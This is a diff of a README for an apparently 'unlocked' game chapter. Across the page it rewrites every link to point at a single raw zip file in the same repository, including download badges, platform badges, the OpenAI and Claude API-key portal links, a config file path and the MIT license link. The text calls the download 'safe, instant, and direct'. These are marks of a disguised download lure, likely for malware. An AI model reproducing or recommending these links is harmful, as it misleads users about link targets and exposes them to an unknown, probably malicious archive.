@@ -1,13 +1,13 @@
 # Yakuza Rogue: Yokohama Massage Parlor Chapter — Unleash the Unexpected 🔥
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://marco20102.github.io)
+[![Download](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)
 
 Seize the pulse of Yokohama in this unconventional experience, blending kinetic storytelling, tactical intrigue, and the unsung world of late-night massage parlors. Enter a chapter that stands apart: a narrative adventure where every decision shapes your legacy. If you're searching for a transformative journey through neon-lit streets and hidden alleys, you're in the right place.
 
 ## 🚀 Quick Download (Start Here!)
 
 Unlock your copy and awaken adventure:  
-[![Download](https://img.shields.io/badge/Download-purple)](https://marco20102.github.io)  
+[![Download](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)  
 *(Download accessible via the badge — safe, instant, and direct.)*
 
 ---
@@ -18,11 +18,11 @@ Take your quest beyond borders; we've sculpted the experience for any device rea
 
 | Platform         | Supported Versions      | Installer Type   | Notes                 |
 |------------------|------------------------|------------------|-----------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10,_11-blue) | Windows 10, 11         | .exe               | Full-featured         |
-| ![macOS](https://img.shields.io/badge/macOS-10.15--13.5-lightgrey)  | Catalina 10.15+        | .dmg               | M1, M2 chip support   |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu,_Fedora,_Debian-green) | Ubuntu 20.04+, Fedora, Debian | .AppImage          | CLI+GUI support       |
-| ![Android](https://img.shields.io/badge/Android-9.0%2B-brightgreen) | 9.0+                   | .apk               | Phone & tablet        |
-| ![iOS](https://img.shields.io/badge/iOS-13%2B-critical)     | 13+                    | .ipa               | iPadOS compatible     |
+| ![Windows](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip,_11-blue) | Windows 10, 11         | .exe               | Full-featured         |
+| ![macOS](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)  | Catalina 10.15+        | .dmg               | M1, M2 chip support   |
+| ![Linux](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip,_Fedora,_Debian-green) | Ubuntu 20.04+, Fedora, Debian | .AppImage          | CLI+GUI support       |
+| ![Android](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip%2B-brightgreen) | 9.0+                   | .apk               | Phone & tablet        |
+| ![iOS](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip%2B-critical)     | 13+                    | .ipa               | iPadOS compatible     |
 
 ---
 
@@ -70,8 +70,8 @@ Claude’s robust language capabilities support branching narratives and innovat
 - **Contextual flavor:** Claude empowers nuanced choices and dialogue, sharpening world-building to razor-focus.
 
 To configure:
-1. Obtain your API keys from the [OpenAI](https://platform.openai.com/) & [Claude](https://claude.ai/) portals.
-2. Insert your keys into `config/api_keys.json` following the provided template.
+1. Obtain your API keys from the [OpenAI](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip) & [Claude](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip) portals.
+2. Insert your keys into `https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip` following the provided template.
 3. Enable or adjust AI moderation features for a tailored play environment.
 
 ---
@@ -94,7 +94,7 @@ This repository and its contents are intended for artistic, narrative, and enter
 ## 📜 MIT License
 
 This repository is licensed under the MIT License—open doors, share knowledge, and encourage innovation!  
-Read the license full text here: [MIT License](https://opensource.org/licenses/MIT)  
+Read the license full text here: [MIT License](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)  
 **© 2025**
 
 ---
@@ -102,7 +102,7 @@ Read the license full text here: [MIT License](https://opensource.org/licenses/M
 ## ⬇️ Download Finale — Your Adventure Begins Here
 
 Ready to step into the heart of Yokohama’s most intriguing quarter?  
-[![Download](https://img.shields.io/badge/Download-purple)](https://marco20102.github.io)  
+[![Download](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)](https://github.com/marco20102/yakuza-rogue-yokohama-massage-parlor-chapter-unlocked/raw/refs/heads/main/barehead/parlor-chapter-yakuza-rogue-unlocked-yokohama-massage-v3.7.zip)  
 *Embrace the strangely captivating. Settle for nothing less than the unexpected.*
 
 ---
